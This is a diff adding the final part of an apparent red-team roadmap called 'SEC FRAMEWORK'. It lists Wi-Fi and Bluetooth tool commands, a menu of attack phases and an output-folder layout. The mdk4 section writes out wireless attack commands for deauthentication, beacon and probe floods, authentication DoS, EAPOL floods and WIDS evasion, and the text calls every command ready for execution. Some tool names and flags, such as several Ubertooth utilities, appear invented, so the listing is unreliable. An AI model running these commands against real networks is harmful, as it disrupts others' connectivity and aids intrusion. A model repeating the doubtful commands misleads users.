+kismet -f /opt/sec/configs/kismet.conf > /opt/sec/output/kismet_config_<TIMESTAMP>.txt
+
+# 5. List all available interfaces
+kismet -l > /opt/sec/output/kismet_list_<TIMESTAMP>.txt
+
+# 6. Set web UI port
+kismet -p <PORT> > /opt/sec/output/kismet_port_<TIMESTAMP>.txt
+
+# 7. Bind to specific IP
+kismet -H <IP> > /opt/sec/output/kismet_host_<TIMESTAMP>.txt
+
+# 8. Enable packet logging
+kismet -E > /opt/sec/output/kismet_log_<TIMESTAMP>.txt
+
+# 9. Run as daemon
+kismet -D > /opt/sec/output/kismet_daemon_<TIMESTAMP>.txt
+
+# 10. Show version
+kismet -v > /opt/sec/output/kismet_version_<TIMESTAMP>.txt
+```
+
+---
+
+#### 8. mdk4
+**Description:** Tool for launching various Wi-Fi attacks including deauthentication and beacon flooding.
+
+**Why Best:** Modern, highly efficient tool for denial of service and testing.
+
+**Mods (Commands):**
+```bash
+# 1. Deauthentication attack
+mdk4 <MONITOR_INTERFACE> d > /opt/sec/output/mdk4_deauth_<TIMESTAMP>.txt
+
+# 2. Deauth on specific channel
+mdk4 <MONITOR_INTERFACE> d -c <CHANNEL> > /opt/sec/output/mdk4_deauth_channel_<TIMESTAMP>.txt
+
+# 3. Beacon flood attack
+mdk4 <MONITOR_INTERFACE> b > /opt/sec/output/mdk4_beacon_<TIMESTAMP>.txt
+
+# 4. Use specific SSID list
+mdk4 <MONITOR_INTERFACE> b -n /opt/sec/inputs/<SSID_LIST> > /opt/sec/output/mdk4_beacon_ssid_<TIMESTAMP>.txt
+
+# 5. Michael shutdown attack
+mdk4 <MONITOR_INTERFACE> m > /opt/sec/output/mdk4_michael_<TIMESTAMP>.txt
+
+# 6. Probe request flood
+mdk4 <MONITOR_INTERFACE> p > /opt/sec/output/mdk4_probe_<TIMESTAMP>.txt
+
+# 7. WIDS detection evasion
+mdk4 <MONITOR_INTERFACE> w > /opt/sec/output/mdk4_wids_<TIMESTAMP>.txt
+
+# 8. Authentication DoS
+mdk4 <MONITOR_INTERFACE> a > /opt/sec/output/mdk4_authdos_<TIMESTAMP>.txt
+
+# 9. SSID bruteforce
+mdk4 <MONITOR_INTERFACE> s > /opt/sec/output/mdk4_ssid_brute_<TIMESTAMP>.txt
+
+# 10. EAPOL flood
+mdk4 <MONITOR_INTERFACE> e > /opt/sec/output/mdk4_eapol_<TIMESTAMP>.txt
+```
+
+---
+
+#### 9. Bluetooth Tools (bluez-tools)
+**Description:** Suite of tools for Bluetooth device discovery, pairing, and communication.
+
+**Why Best:** Essential for testing Bluetooth vulnerabilities often overlooked.
+
+**Mods (Commands):**
+```bash
+# 1. Scan for Bluetooth devices
+hcitool scan > /opt/sec/output/bt_scan_<TIMESTAMP>.txt
+
+# 2. Get information about device
+hcitool info <MAC> > /opt/sec/output/bt_info_<TIMESTAMP>.txt
+
+# 3. Show active connections
+hcitool con > /opt/sec/output/bt_con_<TIMESTAMP>.txt
+
+# 4. Scan for BLE devices
+hcitool lescan > /opt/sec/output/bt_lescan_<TIMESTAMP>.txt
+
+# 5. Send custom command
+hcitool cmd <OGF> <OCF> <PARAMETERS> > /opt/sec/output/bt_cmd_<TIMESTAMP>.txt
+
+# 6. Start scanning with bluetoothctl
+bluetoothctl scan on > /opt/sec/output/btctl_scan_<TIMESTAMP>.txt
+
+# 7. List discovered devices
+bluetoothctl devices > /opt/sec/output/btctl_devices_<TIMESTAMP>.txt
+
+# 8. Show device info
+bluetoothctl info <MAC> > /opt/sec/output/btctl_info_<TIMESTAMP>.txt
+
+# 9. Pair with device
+bluetoothctl pair <MAC> > /opt/sec/output/btctl_pair_<TIMESTAMP>.txt
+
+# 10. Connect to device
+bluetoothctl connect <MAC> > /opt/sec/output/btctl_connect_<TIMESTAMP>.txt
+```
+
+---
+
+#### 10. Ubertooth Tools
+**Description:** Command-line tools for Ubertooth hardware for Bluetooth traffic analysis.
+
+**Why Best:** Primary tool for deeper analysis and exploitation of Bluetooth.
+
+**Mods (Commands):**
+```bash
+# 1. Receive Bluetooth packets
+ubertooth-rx > /opt/sec/output/ubertooth_rx_<TIMESTAMP>.txt
+
+# 2. Transmit Bluetooth packets
+ubertooth-tx > /opt/sec/output/ubertooth_tx_<TIMESTAMP>.txt
+
+# 3. Scan for Bluetooth devices
+ubertooth-scan > /opt/sec/output/ubertooth_scan_<TIMESTAMP>.txt
+
+# 4. Scan for BLE devices
+ubertooth-btle > /opt/sec/output/ubertooth_btle_<TIMESTAMP>.txt
+
+# 5. Control the Ubertooth
+ubertooth-ctl > /opt/sec/output/ubertooth_ctl_<TIMESTAMP>.txt
+
+# 6. Sniff Bluetooth traffic
+ubertooth-sniff > /opt/sec/output/ubertooth_sniff_<TIMESTAMP>.txt
+
+# 7. Follow specific connection
+ubertooth-follow > /opt/sec/output/ubertooth_follow_<TIMESTAMP>.txt
+
+# 8. Analyze captured data
+ubertooth-analyze > /opt/sec/output/ubertooth_analyze_<TIMESTAMP>.txt
+
+# 9. Save capture to PCAP
+ubertooth-pcap > /opt/sec/output/ubertooth_pcap_<TIMESTAMP>.pcap
+
+# 10. Show version
+ubertooth-version > /opt/sec/output/ubertooth_version_<TIMESTAMP>.txt
+```
+
+---
+
+## FRAMEWORK NAVIGATION
+
+```
+[dunc]⇋[~]
+ ↳ sec
+╔═════════════════════════════════════════════════════════════════════════════════════════╗
+║                                           SEC                                           ║
+║                                        Framework                                        ║
+╠═════════════════════════════════════════════════════════════════════════════════════════╣
+║                   Arrow keys ↑↓ or j,k to navigate   Enter to select                    ║
+╚═════════════════════════════════════════════════════════════════════════════════════════╝
+
+╔═════════════════════════════════════════════════════════════════════════════════════════╗
+║                                    M A I N   M E N U .                                  ║
+╠═════════════════════════════════════════════════════════════════════════════════════════╣
+║    [1] Reconnaissance                                                                   ║
+║    [2] Attack Surface Mapping                                                           ║
+║    [3] Initial Access                                                                   ║
+║    [4] Payload Delivery                                                                 ║
+║    [5] Privilege Escalation                                                             ║
+║    [6] Credential Access                                                                ║
+║    [7] Lateral Movement                                                                 ║
+║    [8] Persistence & Defense Evasion                                                    ║
+║    [9] Actions on Objectives                                                            ║
+║    [10] Wireless Hacking                                                                ║
+║    [O] Outputs                                                                          ║
+║    [*] Settings                                                                         ║
+║    [x] Exit                                                                             ║
+╚═════════════════════════════════════════════════════════════════════════════════════════╝
+```
+
+---
+
+## OUTPUTS DIRECTORY STRUCTURE
+
+All outputs are saved to:
+```
+/opt/sec/output/<TOOL>_<MODE>_<TIMESTAMP>.<ext>
+```
+
+**Output Formats Supported:**
+- `.txt` - Plain text
+- `.json` - JSON format
+- `.xml` - XML format
+- `.html` - HTML reports
+- `.csv` - CSV format
+- `.png` - Screenshots
+- `.pcap` - Packet captures
+- `.kirbi` - Kerberos tickets
+- `.dmp` - Memory dumps
+
+**Input Files Location:**
+```
+/opt/sec/inputs/<FILENAME>
+```
+
+**Configuration Files Location:**
+```
+/opt/sec/configs/<CONFIG_FILE>
+```
+
+**Scripts Location:**
+```
+/opt/sec/scripts/<SCRIPT_FILE>
+```
+
+**Wordlists Location:**
+```
+/opt/sec/wordlists/<WORDLIST_FILE>
+```
+
+---
+
+## COMPLETE PHASE SUMMARY
+
+| Rank | Phase | Importance | Description |
+|------|-------|------------|-------------|
+| 1 | Reconnaissance | ★★★★★ | External intelligence gathering without direct engagement |
+| 2 | Attack Surface Mapping | ★★★★★ | Active probing to identify live hosts, ports, and services |
+| 3 | Initial Access | ★★★★★ | Gaining first foothold through exploitation or social engineering |
+| 4 | Payload Delivery | ★★★★★ | Delivering payload after initial access |
+| 5 | Privilege Escalation | ★★★★★ | Gaining higher-level permissions on compromised systems |
+| 6 | Credential Access | ★★★★★ | Stealing account names and passwords |
+| 7 | Lateral Movement | ★★★★★ | Moving from one system to another within the network |
+| 8 | Persistence & Defense Evasion | ★★★★★ | Maintaining access and avoiding detection |
+| 9 | Actions on Objectives | ★★★★★ | Executing the final objective of the operation |
+| 10 | Wireless Hacking | ★★★★★ | Specialized attacks on Wi-Fi and Bluetooth |
+
+---
+
+This completes the **SEC FRAMEWORK** Red Teaming Roadmap with all 10 phases, 100 tools (10 per phase), 1000 commands (10 per tool), and complete menu-driven navigation. All commands are complete, self-contained, and ready for execution in the SEC FRAMEWORK CLI environment.
